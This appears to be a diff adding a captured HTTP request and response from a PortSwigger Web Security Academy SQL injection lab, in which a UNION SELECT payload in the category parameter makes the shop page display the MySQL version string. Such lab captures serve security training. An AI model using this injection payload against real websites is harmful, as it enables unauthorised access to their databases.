@@ -1,0 +1,122 @@
+GET https://0a9d0002045063b7822d88f9005f00d9.web-security-academy.net/filter?category=Lifestyle'%20union%20select%20@@version,null%23 HTTP/1.1
+host: 0a9d0002045063b7822d88f9005f00d9.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+content-length: 0
+Cookie: session=oR1l9KfBgfER3HFVYcJTrpQplRKS50jM
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 9161
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
+        <title>SQL injection attack, querying the database type and version on MySQL and Microsoft</title>
+    </head>
+    <body>
+        <script src="/resources/labheader/js/labHeader.js"></script>
+        <div id="academyLabHeader">
+            <section class='academyLabBanner'>
+                <div class=container>
+                    <div class=logo></div>
+                        <div class=title-container>
+                            <h2>SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>
+                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
+                            <p id="hint">Make the database retrieve the string: '8.0.39-0ubuntu0.20.04.1'</p>
+                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft'>
+                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                    <g>
+                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                    </g>
+                                </svg>
+                            </a>
+                        </div>
+                        <div class='widgetcontainer-lab-status is-notsolved'>
+                            <span>LAB</span>
+                            <p>Not solved</p>
+                            <span class=lab-status-icon></span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+        <div theme="ecommerce">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href=/>Home</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <section class="ecoms-pageheader">
+                        <img src="/resources/images/shop.svg">
+                    </section>
+                    <section class="ecoms-pageheader">
+                        <h1>Lifestyle&apos; union select @@version,null#</h1>
+                    </section>
+                    <section class="search-filters">
+                        <label>Refine your search:</label>
+                        <a class="filter-category" href="/">All</a>
+                        <a class="filter-category" href="/filter?category=Accessories">Accessories</a>
+                        <a class="filter-category" href="/filter?category=Clothing%2c+shoes+and+accessories">Clothing, shoes and accessories</a>
+                        <a class="filter-category" href="/filter?category=Food+%26+Drink">Food & Drink</a>
+                        <a class="filter-category" href="/filter?category=Lifestyle">Lifestyle</a>
+                        <a class="filter-category" href="/filter?category=Tech+gifts">Tech gifts</a>
+                    </section>
+                    <table class="is-table-longdescription">
+                        <tbody>
+                        <tr>
+                            <th>Your Virtual Journey Starts Here</th>
+                            <td>There are times when you want to see that big wide world outside your front door, but you can&apos;t get away. There could be work, financial, and even physical constraints holding you back. Here at &apos;Your Virtual Journey&apos; we have overcome these hurdles to the best of our ability.
+Picture this. You&apos;re sitting at home, feet up, with a steaming hot cup of coffee. The phone rings, and on the other end is someone who is traveling to where it is you want to go. They will give you a complete audio description of the route they are taking, and be your eyes when they arrive at the final destination. Just close your eyes and be transported to anywhere in the world for the cost of a phone call.
+As well as a &apos;pay as you go&apos; service you can subscribe annually for an unlimited package. What a great gift for someone who would benefit from a little adventure in their lives. Your number will never be visible to our callers, it will be redirected through our main switchboard. For &apos;pay as you go&apos; premium rates apply, so take the opportunity to go unlimited today.</td>
+                        </tr>
+                        <tr>
+                            <th>Eco Boat</th>
+                            <td>In a world that is changing, on a planet we are learning to love and take care of, the more we can do to help the environment the better. Here at Planet Love, we are taking this quest very seriously. Let us introduce the first eco, single-use, boat.
+The Eco Boat is made entirely from paper and reinforced with a super strength adhesive, which will keep you afloat for 30 minutes. After 30 minutes the adhesive will have dissolved due to the high salt content in the ocean, therefore, it is paramount you time your trip to the second. Fifteen minutes each way is more than enough time to enjoy a romantic sunset or to partake of a light supper.
+In conjunction with the beach services committee, a number of recycling tubs have been situated in the most popular tourist attractions. After your journey, you will be able to easily fold up the soggy paper and pop it into one of the conveniently positioned receptacles. How many people can say they have enjoyed such a unique experience, and been proactive in saving our beautiful planet at the same time?
+Lead the way in leisure activities and join Planet Love today.</td>
+                        </tr>
+                        <tr>
+                            <th>Packaway Carport</th>
+                            <td>We all know garages aren&apos;t used for parking our cars and keeping them safe from the elements. Garages are for storing lots of really useful things; tools, half tins of paint, the kids&apos; old drawings etc&apos; So the question is what do you do with your precious four-wheeled friend?
+Say hello to the Packaway Carport. Practical and pleasing to the eye, all your neighbors&apos; eyes will be on you! Best of all if you are away on vacation, or the car is off being serviced, you can pack the carport away and you&apos;ll never know it was there. No expensive and time-consuming building work to upset your routine and wallet.
+The outer material is highly durable, and when anchored according to our handy user&apos;s guide, will be sturdy enough to stay in situ against all weather fronts. A large number of sandbags and bricks come as essential add ons, please bear this in mind when you are placing your order.
+There are so many different colors and designs to choose from you will be spoiled for choice. We even have a bespoke camouflage package where the carport can be designed to blend in with its surroundings. Pack away your worries with the Packaway Carport.</td>
+                        </tr>
+                        <tr>
+                            <th>BURP Protection</th>
+                            <td>BURP is a newly available wind suppressant that will protect you in all those potentially embarrassing situations. This is the only protection proven to work following a study of one hundred users. A delicious sweet that never dissolves, it will constantly protect you in the background as you go about your day.
+The first long-term solution to hiccups, that can really bring you down and get in the way of productivity. BURP is the latest brand on everyone&apos;s lips and we want to celebrate our success with you by offering you peace of mind, and a money back guarantee if your wind isn&apos;t kept in check.
+BURP&apos;s ultra-sensitive technology can also detect when wind is on its way, you never need to get caught out again, the sweet releases extra chemicals to identify the problem area and hit the spot before the wind can work its way up to your mouth. With zero sugar we ensure your teeth won&apos;t suffer while using our product, if anything your smile will be bigger and brighter as all the stress leaves your body (1 out of 8 users agree).</td>
+                        </tr>
+                        <tr>
+                            <th>8.0.39-0ubuntu0.20.04.1</th>
+                        </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+            <div class="footer-wrapper">
+            </div>
+        </div>
+    </body>
+</html>
